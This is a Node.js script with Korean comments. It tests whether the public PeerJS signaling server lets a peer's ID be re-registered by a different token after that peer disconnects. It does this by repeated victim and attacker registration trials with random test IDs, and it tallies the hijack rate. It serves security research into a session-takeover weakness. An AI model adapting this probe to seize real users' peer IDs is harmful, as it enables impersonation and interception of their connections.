// PeerJS 공용 시그널링(0.peerjs.com)에서 "끊긴 피어의 id 재등록" 가능 여부 실측.
// 테스트 전용 접두어·랜덤 id만 사용. 각 시도: 피해자 등록 → (대조) 접속 중 공격자 등록 → 피해자 종료 → 공격자 등록.
const HOST = 'wss://0.peerjs.com/peerjs?key=peerjs';
const N = Number(process.argv[2] || 20);
const rnd = () => Math.random().toString(36).slice(2, 10);

function register(id, token, timeoutMs = 8000) {
  return new Promise(resolve => {
    const t0 = Date.now();
    const ws = new WebSocket(`${HOST}&id=${id}&token=${token}`);
    let done = false;
    const fin = (result, detail) => { if (done) return; done = true; clearTimeout(timer); resolve({ result, detail, ms: Date.now() - t0, ws }); };
    const timer = setTimeout(() => fin('TIMEOUT'), timeoutMs);
    ws.onmessage = e => {
      let m; try { m = JSON.parse(e.data); } catch { return; }
      if (m.type === 'OPEN') fin('OPEN');
      else if (m.type === 'ID-TAKEN') fin('ID-TAKEN', m.payload?.msg);
      else if (m.type === 'ERROR') fin('ERROR', m.payload?.msg);
    };
    ws.onerror = () => fin('WS_ERROR');
    ws.onclose = () => fin('CLOSED');
  });
}
const closeWs = ws => new Promise(r => { if (ws.readyState === 3) return r(); ws.onclose = () => r(); try { ws.close(); } catch { r(); } });
const sleep = ms => new Promise(r => setTimeout(r, ms));

const rows = [];
for (let i = 1; i <= N; i++) {
  const id = `mctheory${rnd()}${rnd()}`;
  const row = { i, id, startedAt: new Date().toISOString() };
  const victim = await register(id, rnd());
  row.victim = victim.result;
  if (victim.result !== 'OPEN') { rows.push(row); await closeWs(victim.ws); continue; }

  // 대조: 피해자가 접속 중일 때 공격자(다른 토큰)가 등록 시도 → 거부돼야 정상
  const live = await register(id, rnd());
  row.whileConnected = live.result;
  await closeWs(live.ws);

  // 피해자 연결 종료 → 공격자(다른 토큰) 등록 시도
  await closeWs(victim.ws);
  const t0 = Date.now();
  let hij = await register(id, rnd());
  row.afterDrop = hij.result;
  row.afterDropMs = Date.now() - t0;
  await closeWs(hij.ws);
  row.endedAt = new Date().toISOString();
  rows.push(row);
  await sleep(300); // 공용 서버에 예의상 간격
}

const count = (k, v) => rows.filter(r => r[k] === v).length;
for (const r of rows) console.log(JSON.stringify(r));
console.log('---');
console.log(`시도 ${rows.length}회`);
console.log(`피해자 등록 OPEN: ${count('victim', 'OPEN')}`);
console.log(`접속 중 공격자 등록 → ID-TAKEN(거부): ${count('whileConnected', 'ID-TAKEN')} / OPEN(탈취): ${count('whileConnected', 'OPEN')}`);
console.log(`피해자 종료 후 공격자 등록 → OPEN(탈취 성공): ${count('afterDrop', 'OPEN')} / ID-TAKEN: ${count('afterDrop', 'ID-TAKEN')} / 기타: ${rows.length - count('afterDrop', 'OPEN') - count('afterDrop', 'ID-TAKEN')}`);
